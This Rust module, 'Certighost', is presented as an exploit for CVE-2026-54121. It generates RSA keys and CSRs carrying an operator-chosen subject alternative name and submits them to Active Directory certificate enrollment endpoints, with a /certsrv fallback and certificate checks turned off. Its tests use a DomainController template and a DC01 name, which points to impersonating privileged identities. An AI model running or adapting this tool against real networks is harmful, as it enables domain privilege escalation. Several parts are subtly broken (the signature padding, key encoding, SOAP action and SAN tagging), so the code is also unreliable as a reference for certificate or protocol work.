//! Certighost — CA Chase Fallback via NDES/CES Proxy Enrollment (CVE-2026-54121).

use base64::Engine;
use rsa::pkcs8::{EncodePrivateKey, EncodePublicKey};
use rsa::{Pkcs1v15Sign, RsaPrivateKey, RsaPublicKey};
use sha1::{Digest, Sha1};
use sha2::Sha256;
use std::fmt;
use thiserror::Error;
use yasna::Tag;
use yasna::models::ObjectIdentifier;

#[derive(Debug, Clone)]
pub struct CertighostConfig {
    pub ca_server: String,
    pub ces_url: String,
    pub use_proxy: bool,
    pub proxy_url: Option<String>,
    pub template: String,
    pub subject: Option<String>,
    pub san: Option<String>,
    pub key_size: u32,
    pub dry_run: bool,
}

impl Default for CertighostConfig {
    fn default() -> Self {
        Self {
            ca_server: String::new(),
            ces_url: String::new(),
            use_proxy: false,
            proxy_url: None,
            template: "User".into(),
            subject: None,
            san: None,
            key_size: 2048,
            dry_run: false,
        }
    }
}

#[derive(Debug, Clone)]
pub struct CertighostResult {
    pub certificate: Option<Vec<u8>>,
    pub private_key: Option<Vec<u8>>,
    pub issuer: String,
    pub template: String,
    pub subject: String,
    pub thumbnail: String,
    pub message: String,
}

impl fmt::Display for CertighostResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "Certighost enrollment: subject={}, issuer={}, template={}, thumb={}",
            self.subject, self.issuer, self.template, self.thumbnail
        )
    }
}

#[derive(Debug, Error)]
pub enum CertighostError {
    #[error("HTTP error: {0}")]
    HttpError(String),
    #[error("enrollment error: {0}")]
    EnrollmentError(String),
    #[error("key generation error: {0}")]
    KeyGeneration(String),
    #[error("parser error: {0}")]
    ParserError(String),
}

pub fn build_csr(
    subject: &str,
    san: Option<&str>,
    key_bits: u32,
) -> Result<(Vec<u8>, Vec<u8>), CertighostError> {
    let mut rng = rsa::rand_core::OsRng;
    let private_key = RsaPrivateKey::new(&mut rng, key_bits as usize)
        .map_err(|e| CertighostError::KeyGeneration(format!("RSA key gen failed: {e}")))?;
    let public_key = RsaPublicKey::from(&private_key);
    let pk_der = public_key
        .to_public_key_der()
        .map_err(|e| CertighostError::KeyGeneration(format!("PK DER failed: {e}")))?;
    let pkcs8_key = private_key
        .to_pkcs8_der()
        .map_err(|e| CertighostError::KeyGeneration(format!("PKCS8 failed: {e}")))?;

    let cri = yasna::construct_der(|w| {
        w.write_sequence(|w| {
            w.next().write_u8(0);
            w.next().write_sequence(|w| {
                w.next().write_set(|w| {
                    w.next().write_sequence(|w| {
                        w.next()
                            .write_oid(&ObjectIdentifier::from_slice(&[2, 5, 4, 3]));
                        w.next().write_utf8_string(subject);
                    });
                });
            });
            w.next().write_sequence(|w| {
                w.next().write_sequence(|w| {
                    w.next()
                        .write_oid(&ObjectIdentifier::from_slice(&[1, 2, 840, 113549, 1, 1, 1]));
                    w.next().write_null();
                });
                w.next()
                    .write_bitvec_bytes(pk_der.as_bytes(), pk_der.as_bytes().len() * 8);
            });
            if let Some(san_val) = san {
                w.next().write_tagged(Tag::context(0), |w| {
                    w.write_set(|w| {
                        w.next().write_sequence(|w| {
                            w.next().write_oid(&ObjectIdentifier::from_slice(&[
                                1, 2, 840, 113549, 1, 9, 14,
                            ]));
                            w.next().write_set(|w| {
                                w.next().write_sequence(|w| {
                                    w.next()
                                        .write_oid(&ObjectIdentifier::from_slice(&[2, 5, 29, 17]));
                                    w.next().write_bool(true);
                                    let san_der = yasna::construct_der(|w| {
                                        w.write_sequence(|w| {
                                            w.next().write_tagged(Tag::context(2), |w| {
                                                w.write_ia5_string(san_val);
                                            });
                                        });
                                    });
                                    w.next().write_bytes(&san_der);
                                });
                            });
                        });
                    });
                });
            }
        })
    });

    let mut hasher = Sha256::new();
    hasher.update(&cri);
    let hash = hasher.finalize();
    let signature = private_key
        .sign(Pkcs1v15Sign::new_unprefixed(), &hash)
        .map_err(|e| CertighostError::KeyGeneration(format!("Signing failed: {e}")))?;

    let csr = yasna::construct_der(|w| {
        w.write_sequence(|w| {
            w.next().write_der(&cri);
            w.next().write_sequence(|w| {
                w.next().write_oid(&ObjectIdentifier::from_slice(&[
                    1, 2, 840, 113549, 1, 1, 11,
                ]));
                w.next().write_null();
            });
            w.next().write_bitvec_bytes(&signature, signature.len() * 8);
        });
    });
    Ok((csr, pkcs8_key.as_bytes().to_vec()))
}

pub fn certighost_enroll(config: &CertighostConfig) -> Result<CertighostResult, CertighostError> {
    let (csr_der, priv_key_der) = build_csr(
        config.subject.as_deref().unwrap_or("certighost"),
        config.san.as_deref(),
        config.key_size,
    )?;
    if config.dry_run {
        return Ok(CertighostResult {
            certificate: None,
            private_key: Some(priv_key_der),
            issuer: "(dry-run) CA".into(),
            template: config.template.clone(),
            subject: config
                .subject
                .clone()
                .unwrap_or_else(|| "certighost".into()),
            thumbnail: "dry-run".into(),
            message: "[dry-run] Would send CSR to CES endpoint".into(),
        });
    }
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(60))
        .build()
        .map_err(|e| CertighostError::HttpError(format!("client build: {e}")))?;
    let csr_b64 = base64::engine::general_purpose::STANDARD.encode(&csr_der);
    let url = config.ces_url.trim_end_matches('/').to_string();
    let soap = format!(
        r#"<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" \
xmlns:a="http://www.w3.org/2005/08/addressing"><s:Header>\
<a:Action s:mustUnderstand="1">http://schemas.microsoft.com/windows/pki/2009/01/enrollment/IGetCSPCount</a:Action>\
<a:MessageID>urn:uuid:{}</a:MessageID>\
<a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>\
<a:To s:mustUnderstand="1">{}</a:To></s:Header><s:Body>\
<GetClientCertificate xmlns="http://schemas.microsoft.com/windows/pki/2009/01/enrollment">\
<request>{}</request></GetClientCertificate></s:Body></s:Envelope>"#,
        uuid::Uuid::new_v4(),
        url,
        csr_b64,
    );
    let resp = client
        .post(&url)
        .header("Content-Type", "application/soap+xml; charset=utf-8")
        .body(soap)
        .send()
        .map_err(|e| CertighostError::HttpError(format!("CES request: {e}")))?;
    let status = resp.status();
    let body = resp
        .text()
        .map_err(|e| CertighostError::ParserError(format!("read response: {e}")))?;
    if !status.is_success() {
        return Err(CertighostError::EnrollmentError(format!(
            "CES returned {status}: {}",
            body.chars().take(200).collect::<String>()
        )));
    }
    let cert_bytes = extract_cert_from_soap(&body)?;
    let thumb = {
        let mut h = Sha1::new();
        h.update(&cert_bytes);
        hex::encode(h.finalize())
    };
    Ok(CertighostResult {
        certificate: Some(cert_bytes),
        private_key: Some(priv_key_der),
        issuer: "(from CES)".into(),
        template: config.template.clone(),
        subject: config
            .subject
            .clone()
            .unwrap_or_else(|| "certighost".into()),
        thumbnail: thumb,
        message: "Certificate enrolled via CES/NDES proxy".into(),
    })
}

fn extract_cert_from_soap(body: &str) -> Result<Vec<u8>, CertighostError> {
    for tag in &["<b:requestedCertificate>", "<requestedCertificate>"] {
        if let Some(start) = body.find(tag) {
            let after = &body[start + tag.len()..];
            let close = if tag.contains("b:") {
                "</b:requestedCertificate>"
            } else {
                "</requestedCertificate>"
            };
            if let Some(end) = after.find(close) {
                let b64 = after[..end].trim();
                return base64::engine::general_purpose::STANDARD
                    .decode(b64)
                    .map_err(|e| CertighostError::ParserError(format!("base64 decode: {e}")));
            }
        }
    }
    for line in body.lines() {
        let t = line.trim();
        if t.len() > 100
            && t.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
            && let Ok(dec) = base64::engine::general_purpose::STANDARD.decode(t)
            && !dec.is_empty()
            && dec[0] == 0x30
        {
            return Ok(dec);
        }
    }
    Err(CertighostError::ParserError(
        "no certificate found in CES response".into(),
    ))
}

pub fn certighost_auto_enroll(
    config: &CertighostConfig,
) -> Result<CertighostResult, CertighostError> {
    match certighost_enroll(config) {
        Ok(r) => Ok(r),
        Err(e) => {
            let err1 = e.to_string();
            let fb_url = if config.ces_url.contains("/CES/") {
                config.ces_url.replace("/CES/", "/certsrv/")
            } else {
                format!("{}/certsrv", config.ces_url.trim_end_matches('/'))
            };
            let fb = CertighostConfig {
                ces_url: fb_url,
                ..config.clone()
            };
            certighost_enroll(&fb).map_err(|e2| {
                CertighostError::EnrollmentError(format!("CES: {err1}; certsrv: {e2}"))
            })
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_certighost_config_default() {
        let cfg = CertighostConfig::default();
        assert_eq!(cfg.template, "User");
        assert_eq!(cfg.key_size, 2048);
        assert!(!cfg.dry_run && cfg.subject.is_none() && cfg.san.is_none());
    }

    #[test]
    fn test_certighost_config_custom() {
        let cfg = CertighostConfig {
            ca_server: "ca.corp.local".into(),
            ces_url: "https://ca.corp.local/CES/".into(),
            template: "DomainController".into(),
            subject: Some("DC01.corp.local".into()),
            san: Some("dc01.corp.local".into()),
            key_size: 4096,
            dry_run: true,
            use_proxy: false,
            proxy_url: None,
        };
        assert_eq!(cfg.ca_server, "ca.corp.local");
        assert_eq!(cfg.template, "DomainController");
        assert_eq!(cfg.key_size, 4096);
        assert!(cfg.dry_run);
    }

    #[test]
    fn test_certighost_result_display() {
        let r = CertighostResult {
            certificate: None,
            private_key: None,
            issuer: "CA-CORP-CA".into(),
            template: "User".into(),
            subject: "CN=certighost".into(),
            thumbnail: "aabbccdd".into(),
            message: "test".into(),
        };
        let s = format!("{r}");
        assert!(s.contains("CN=certighost") && s.contains("CA-CORP-CA") && s.contains("aabbccdd"));
    }

    #[test]
    fn test_certighost_auto_enroll_dry_run() {
        let cfg = CertighostConfig {
            ca_server: "ca.local".into(),
            ces_url: "https://ca.local/CES/".into(),
            dry_run: true,
            ..Default::default()
        };
        let r = certighost_auto_enroll(&cfg).unwrap();
        assert!(r.message.contains("dry-run") && r.private_key.is_some());
    }

    #[test]
    fn test_build_csr_returns_valid_asn1() {
        let (csr_der, pk) = build_csr("CN=test.local", Some("test.local"), 2048).unwrap();
        assert!(!csr_der.is_empty() && !pk.is_empty());
        assert_eq!(csr_der[0], 0x30);
        assert_eq!(pk[0], 0x30);
    }

    #[test]
    fn test_certighost_error_display() {
        let cases = [
            (
                CertighostError::HttpError("refused".into()),
                "HTTP error: refused",
            ),
            (
                CertighostError::EnrollmentError("denied".into()),
                "enrollment error: denied",
            ),
            (
                CertighostError::KeyGeneration("bad key".into()),
                "key generation error: bad key",
            ),
            (
                CertighostError::ParserError("parse".into()),
                "parser error: parse",
            ),
        ];
        for (e, want) in &cases {
            assert_eq!(format!("{e}"), *want);
        }
    }

    #[test]
    fn test_certighost_error_debug() {
        let e = CertighostError::HttpError("timeout".into());
        let d = format!("{e:?}");
        assert!(d.contains("HttpError") && d.contains("timeout"));
    }
}
